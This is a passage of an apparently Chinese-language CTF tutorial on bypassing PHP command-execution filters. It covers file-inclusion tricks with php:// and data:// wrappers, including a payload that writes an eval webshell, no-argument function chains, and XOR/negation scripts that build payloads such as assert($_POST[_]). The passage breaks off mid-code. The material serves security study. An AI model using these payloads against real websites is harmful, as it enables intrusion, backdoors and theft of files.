改文件名</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp fla?.php <span class="hljs-number">1</span>.txt<br>mv fla?.php <span class="hljs-number">1</span>.txt<br><span class="hljs-regexp">//</span>另外使用php函数也可以改文件名<br>c=rename(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后访问1.txt</p><h3 id="4-文件包含二次传参"><a href="#4-文件包含二次传参" class="headerlink" title="4.文件包含二次传参"></a>4.文件包含二次传参</h3><p>可以使用include、require来构造文件包含读文件。</p><p>%0a用于换行绕过，另外<strong>include可以不使用()使用?&gt;闭合。</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php //伪协议读</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">   //写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //base64写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;hack&#x27;]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //写后门</span><br><span class="language-xml"></span><br><span class="language-xml">//require和include一样</span><br><span class="language-xml">c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="5-短标签"><a href="#5-短标签" class="headerlink" title="5.短标签"></a>5.短标签</h3><p>写shell bypass较常用。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> :短标签,相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> ,也可以写成</span><span class="language-php"><span class="hljs-meta">&lt;?</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 例如：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flag`<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="6-无参函数绕过"><a href="#6-无参函数绕过" class="headerlink" title="6.无参函数绕过"></a>6.无参函数绕过</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/110840156">https://blog.csdn.net/weixin_46330722/article/details/110840156</a></p><p>有时候会遇到如下类型的过滤：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>意思就是传入的函数必须是无参执行的，像phpinfo()之类。</p><p>我们绕过的思路就是利用php的一些无参函数的返回值，一层层嵌套执行。</p><h4 id="getallheaders-、end-、implode"><a href="#getallheaders-、end-、implode" class="headerlink" title="getallheaders() 、end()、implode()"></a>getallheaders() 、end()、implode()</h4><p><strong>注：此姿势仅限于apache可以使用。</strong></p><p>getallheaders()顾名思义是获取所有请求头信息，并以数组形式返回。</p><p>end()是取数组中最后一个元素值。</p><p>impode是将数组元素连接成为一个字符串。</p><p>用这三个函数我们可以<strong>提取请求头参数值来命令执行</strong>。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-comment">//请求头部最后添加 spring : phpinfo();//</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()))</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">implode</span>(<span class="hljs-title">getallheaders</span>()))</span><br></code></pre></td></tr></table></figure><h4 id="get-defined-vars-、current-、end"><a href="#get-defined-vars-、current-、end" class="headerlink" title="get_defined_vars() 、current()、end()"></a>get_defined_vars() 、current()、end()</h4><p>这种方式就更通用一些。</p><p>get_defined_vars():获取四个超全局变量GET 、POST、FILES、COOKIE，并以二维数组的形式返回。</p><p>current():可以<strong>将二位数组转换成一维数组</strong>并返回数组中的当前单元；默认是GET中的第一个。</p><p>我们可以使用end(current(get_defined_vars()))获取传递的最后一个GET参数值，然后eval执行</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())))&amp;<span class="hljs-variable">spring</span>=<span class="hljs-title">phpinfo</span>();</span><br><span class="hljs-function"><span class="hljs-comment">//spring的值被前面获取到并执行</span></span><br></code></pre></td></tr></table></figure><h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h4><p>session_id()函数用于返回当前会话PHPSESSID的值，当然需要先执行session_start()来开启session。</p><p>然后我们在PHPSESSID中写入恶意代码就可以被获取到并执行。</p><p>但要注意PHPSESSID只允许[A-Za-z0-9]，因此我们还要将恶意代码转换成16进制再用hex2bin解码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">赋值PHPSESSID=706870696e666f28293b  <span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">phpinfo</span><span class="hljs-params">()</span></span>;<br>code=eval(hex2bin(session_id(session_start())))<br></code></pre></td></tr></table></figure><h4 id="PHP函数直接读文件"><a href="#PHP函数直接读文件" class="headerlink" title="PHP函数直接读文件"></a>PHP函数直接读文件</h4><p>以一道题目为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/&#124;filter:\/\/&#124;php:\/\/&#124;phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et&#124;na&#124;info&#124;dec&#124;bin&#124;hex&#124;oct&#124;pi&#124;log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据过滤来看前面三种都不能用了，因此要换个思路。</p><blockquote><p>localeconv():返回一个包含本地数字及货币格式信息的数组，重点在于<strong>返回数组第一个元素是 <code> .</code></strong> ，因此我们用current取出<code>.</code>来读取当前目录。</p><p>scandir():列出目录中的文件和目录</p><p>pos():和current()一样输出数组中当前元素的值。</p><p>关于数组操作还有一些函数：</p><ul><li><a href="https://www.php.net/manual/zh/function.end.php">end()</a> - 将数组的内部指针指向最后一个单元</li><li><a href="https://www.php.net/manual/zh/function.key.php">key()</a> - 从关联数组中取得键名</li><li><a href="https://www.php.net/manual/zh/function.each.php">each()</a> - 返回数组中当前的键／值对并将数组指针向前移动一步</li><li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a> - 将数组的内部指针倒回一位</li><li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a> - 将数组的内部指针指向第一个单元</li><li><a href="https://www.php.net/manual/zh/function.next.php">next()</a> - 将数组中的内部指针向前移动一位</li></ul><p>chdir():用于跳出目录，比如进入上一层目录就需要chdir(“..”)</p><p>array_reverse():翻转数组，有时候需要的元素太靠后可以用它。</p></blockquote><p>我们据此构造出payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))) <span class="hljs-comment">//打印当前目录下的文件</span><br>exp=print<span class="hljs-constructor">_r(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))))) <span class="hljs-comment">//获取倒数第二个文件名</span><br>exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))))  <span class="hljs-comment">//读取文件内容</span><br></code></pre></td></tr></table></figure><h3 id="7-无字母无数字"><a href="#7-无字母无数字" class="headerlink" title="7.无字母无数字"></a>7.无字母无数字</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>以下面这段代码为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]&#124;[a-z]&#124;\`&#124;\+&#124;\~&#124;\$&#124;\[&#124;\]&#124;\&#123;&#124;\&#125;&#124;\&amp;&#124;\-/i&#x27;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了绝大多数字符，但我们可以<strong>使用没有被过滤的字符两两异或</strong>来获取被过滤的字符。贴个羽师傅的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//异</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//或</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))&#124;&#124;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)&#124;<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再将需要的命令拼接出来即可。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell=<span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_POST&#x27;</span>;<br><span class="hljs-variable">$___</span>=$<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-regexp">//</span> assert(<span class="hljs-variable">$_POST</span>[_]);<br></code></pre></td></tr></table></figure><p>执行env命令打印环境变量就有flag。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>和异或原理差不多，利用两个字符取反来获取想要的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果想使用call_user_func的话可以使用下面这段取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;call_user_func&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;(~&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;,~&#x27;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&#x27;,\&#x27;\&#x27;)&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一些常用的取反payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 